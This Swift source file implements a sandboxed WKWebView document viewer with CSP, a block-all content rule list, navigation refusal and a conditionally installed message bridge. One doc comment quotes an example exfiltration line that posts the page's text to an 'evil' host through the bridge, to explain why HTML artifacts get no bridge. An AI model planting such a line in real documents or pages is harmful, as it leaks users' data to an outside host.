import Foundation
import WebKit
import AgentiaCore

/// Messages the page sends back to the app.
enum PageMessage {
    case ready(outline: [OutlineItem], blockCount: Int)
    case scroll(fraction: Double)
    case copy(text: String)
    case openExternal(url: URL)
    /// The document that asked can run its own script, so the click may not
    /// have come from the reader. Show them the URL first.
    case confirmOpenExternal(url: URL)
}

struct OutlineItem: Decodable, Equatable {
    let id: String
    let level: Int
    let title: String
}

protocol HardenedWebViewDelegate: AnyObject {
    func webView(_ view: HardenedWebView, didReceive message: PageMessage)
    /// Called when the content rule list stops a request, so the toolbar can
    /// show how many were blocked.
    func webView(_ view: HardenedWebView, didBlockRequestCountChange count: Int)
}

/// A WKWebView configured so a document cannot reach the network, cannot
/// persist anything, and cannot navigate away from itself.
///
/// Three independent mechanisms, because any one of them can be wrong:
///  1. the page CSP (`connect-src 'none'`, no remote origins),
///  2. a compiled content rule list that blocks every non-`artifact:` load
///     inside WebKit before a request is issued. Note that subresource blocks
///     are NOT observable through public API — the callback that reports them
///     is private WebKit — so the counter below reflects blocked *navigations*
///     only, and the rule list works silently underneath,
///  3. a navigation delegate that refuses top-level navigation.
final class HardenedWebView: WKWebView {

    weak var pageDelegate: HardenedWebViewDelegate?

    /// The same instance handed to the configuration — assigned before
    /// `super.init` so there is exactly one handler, not two.
    let schemeHandler: ArtifactSchemeHandler

    /// Read back through `configuration` rather than kept as a separate stored
    /// reference. WKWebView copies its configuration at init, and while the
    /// content controller is shared by reference, going through the web view is
    /// the formulation that is guaranteed to address the live object.
    private var userContent: WKUserContentController {
        configuration.userContentController
    }

    private(set) var blockedRequestCount = 0 {
        didSet {
            if blockedRequestCount != oldValue {
                pageDelegate?.webView(self, didBlockRequestCountChange: blockedRequestCount)
            }
        }
    }

    /// When true, the rule list is detached for the current document only.
    private var networkAllowedForCurrentDocument = false

    private var bridgeInstalled = false

    /// The profile the current document loaded under. Needed because a raw
    /// artifact has no shell script and so never announces itself — see
    /// `webView(_:didFinish:)`.
    private var currentProfile: RenderProfile = .markdown

    private static let messageHandlerName = "agentia"

    // MARK: - Construction

    init() {
        let handler = ArtifactSchemeHandler()
        self.schemeHandler = handler

        let configuration = WKWebViewConfiguration()

        // Nothing survives between documents: no cookies, no localStorage, no
        // cache. Two artifacts opened in a row cannot see each other's state.
        configuration.websiteDataStore = .nonPersistent()

        // Media should never start on its own in a document viewer.
        configuration.mediaTypesRequiringUserActionForPlayback = .all
        configuration.setURLSchemeHandler(handler, forURLScheme: ArtifactSchemeHandler.scheme)
        configuration.userContentController = WKUserContentController()

        super.init(frame: .zero, configuration: configuration)

        // The message handler is installed per-load, not here — see
        // setBridgeInstalled(_:). Registering it unconditionally would expose
        // window.webkit.messageHandlers.agentia to an HTML artifact's own
        // script, which runs in the same content world.

        navigationDelegate = self
        uiDelegate = self

        // A document viewer has no back/forward affordance, so swipe navigation
        // would only ever be an accident.
        allowsBackForwardNavigationGestures = false
        allowsMagnification = true

        installContentRuleList()
    }

    @available(*, unavailable)
    required init?(coder: NSCoder) { fatalError("not supported") }

    deinit {
        // WKUserContentController holds message handlers strongly; without this
        // the proxy outlives the view.
        userContent.removeScriptMessageHandler(forName: Self.messageHandlerName)
    }

    /// Install or remove the page-to-host bridge.
    ///
    /// This is the boundary that stops an HTML artifact exfiltrating data. A
    /// script message handler lives in the page content world, and the
    /// htmlArtifact profile deliberately lets the document's own script run in
    /// that same world. With the bridge present, one line inside an artifact —
    ///
    ///     webkit.messageHandlers.agentia.postMessage(
    ///       {type:"openExternal", url:"https://evil/?d="+document.body.innerText})
    ///
    /// — would have the host call NSWorkspace.open, walking straight past all
    /// three containment mechanisms: no request for the CSP to refuse, none for
    /// the rule list to block, and no navigation for the delegate to cancel.
    /// The same channel could write the clipboard silently.
    ///
    /// So the bridge exists only for the markdown profile, where the CSP pins
    /// script-src to the hash of shell.js and the document cannot execute
    /// anything of its own. HTML artifacts lose the copy buttons and scroll
    /// restoration, which is the right trade.
    private func setBridgeInstalled(_ installed: Bool) {
        guard installed != bridgeInstalled else { return }
        if installed {
            userContent.add(MessageProxy(target: self), name: Self.messageHandlerName)
        } else {
            userContent.removeScriptMessageHandler(forName: Self.messageHandlerName)
        }
        bridgeInstalled = installed
    }

    // MARK: - Content rule list

    /// Blocks every load whose URL is not the artifact scheme.
    ///
    /// This is WebKit's own blocker engine, so it acts before a request leaves
    /// the process and reports each block through the navigation delegate.
    private static let blockEverythingRemote = """
    [
      {
        "trigger": { "url-filter": ".*" },
        "action": { "type": "block" }
      },
      {
        "trigger": { "url-filter": "^artifact://" },
        "action": { "type": "ignore-previous-rules" }
      }
    ]
    """

    private static let ruleListIdentifier = "agentia.offline"

    /// Compiles once and installs. Compilation is asynchronous, so a document
    /// opened in the first few milliseconds of launch could in principle load
    /// before the list is attached — the CSP and the navigation delegate cover
    /// that window, which is why containment does not rest on this alone.
    private func installContentRuleList() {
        guard let store = WKContentRuleListStore.default() else { return }

        store.compileContentRuleList(
            forIdentifier: Self.ruleListIdentifier,
            encodedContentRuleList: Self.blockEverythingRemote
        ) { [weak self] list, error in
            guard let self else { return }
            if let error {
                // Not fatal: the other two mechanisms still contain the page.
                // Log rather than degrade silently.
                NSLog("Agentia: content rule list failed to compile: \(error)")
                return
            }
            guard let list, !self.networkAllowedForCurrentDocument else { return }
            self.userContent.add(list)
        }
    }

    /// Let the current document reach the network, until the next load.
    func allowNetworkForCurrentDocument() {
        networkAllowedForCurrentDocument = true
        userContent.removeAllContentRuleLists()
        reload()
    }

    // MARK: - Loading

    func load(page html: String, assetRoot: URL, profile: RenderProfile) {
        // A previous document may have been granted network access, which
        // detached the rule list. Re-arm before loading the next one, or the
        // grant would silently persist across documents.
        if networkAllowedForCurrentDocument {
            networkAllowedForCurrentDocument = false
            installContentRuleList()
        }
        setBridgeInstalled(profile == .markdown)
        currentProfile = profile
        blockedRequestCount = 0
        schemeHandler.setDocument(html: html, assetRoot: assetRoot)
        load(URLRequest(url: ArtifactSchemeHandler.documentURL))
    }

    func noteBlockedRequest() {
        blockedRequestCount += 1
    }
}

// MARK: - Navigation

extension HardenedWebView: WKNavigationDelegate {

    func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationAction: WKNavigationAction,
        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
    ) {
        let url = navigationAction.request.url

        // The decision itself lives in AgentiaCore.NavigationPolicy so it can
        // be tested; this method is only the wiring. The only navigation ever
        // permitted is the document's own load, so a meta refresh, a form post
        // or script setting location cannot replace the view — and for HTML
        // artifacts, which run no shell script, this is the only thing standing
        // between a link and the host.
        switch NavigationPolicy.decide(
            url: url,
            isLinkActivation: navigationAction.navigationType == .linkActivated,
            documentCanScript: currentProfile == .htmlArtifact,
            documentScheme: ArtifactSchemeHandler.scheme,
            documentHost: ArtifactSchemeHandler.documentHost
        ) {
        case .allow:
            decisionHandler(.allow)
        case .openExternally:
            if let url { pageDelegate?.webView(self, didReceive: .openExternal(url: url)) }
            decisionHandler(.cancel)
        case .confirmBeforeOpening:
            if let url {
                pageDelegate?.webView(self, didReceive: .confirmOpenExternal(url: url))
            }
            decisionHandler(.cancel)
        case .block:
            noteBlockedRequest()
            decisionHandler(.cancel)
        }
    }

    func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationResponse: WKNavigationResponse,
        decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void
    ) {
        decisionHandler(.allow)
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        // A markdown page announces itself from shell.js once it has decorated
        // the DOM, which is a truer "ready" than didFinish. A raw artifact runs
        // no shell script and has no bridge to announce itself through, so this
        // is the only signal it will ever give — without it the launch
        // measurement would silently never fire for HTML documents.
        guard currentProfile != .markdown else { return }
        pageDelegate?.webView(self, didReceive: .ready(outline: [], blockCount: 0))
    }

}

// MARK: - UI

extension HardenedWebView: WKUIDelegate {

    func webView(
        _ webView: WKWebView,
        createWebViewWith configuration: WKWebViewConfiguration,
        for navigationAction: WKNavigationAction,
        windowFeatures: WKWindowFeatures
    ) -> WKWebView? {
        // window.open from a document opens nothing.
        if let url = navigationAction.request.url {
            pageDelegate?.webView(self, didReceive: .openExternal(url: url))
        }
        return nil
    }

    func webView(
        _ webView: WKWebView,
        runJavaScriptAlertPanelWithMessage message: String,
        initiatedByFrame frame: WKFrameInfo,
        completionHandler: @escaping () -> Void
    ) {
        // An artifact must not be able to block the app with a modal loop.
        completionHandler()
    }
}

// MARK: - Message bridge

/// Breaks the retain cycle WKUserContentController would otherwise create by
/// holding its message handlers strongly.
private final class MessageProxy: NSObject, WKScriptMessageHandler {
    weak var target: HardenedWebView?

    init(target: HardenedWebView) {
        self.target = target
    }

    func userContentController(
        _ controller: WKUserContentController,
        didReceive message: WKScriptMessage
    ) {
        guard let target,
              let body = message.body as? [String: Any],
              let type = body["type"] as? String else { return }

        switch type {
        case "ready":
            var outline: [OutlineItem] = []
            if let raw = body["outline"] as? [[String: Any]] {
                outline = raw.compactMap { entry in
                    guard let id = entry["id"] as? String,
                          let level = entry["level"] as? Int,
                          let title = entry["title"] as? String else { return nil }
                    return OutlineItem(id: id, level: level, title: title)
                }
            }
            let blocks = body["blockCount"] as? Int ?? 0
            target.pageDelegate?.webView(target, didReceive: .ready(outline: outline,
                                                                    blockCount: blocks))
        case "scroll":
            if let fraction = body["fraction"] as? Double {
                target.pageDelegate?.webView(target, didReceive: .scroll(fraction: fraction))
            }
        case "copy":
            if let text = body["text"] as? String {
                target.pageDelegate?.webView(target, didReceive: .copy(text: text))
            }
        case "openExternal":
            if let string = body["url"] as? String, let url = URL(string: string) {
                target.pageDelegate?.webView(target, didReceive: .openExternal(url: url))
            }
        default:
            break
        }
    }
}
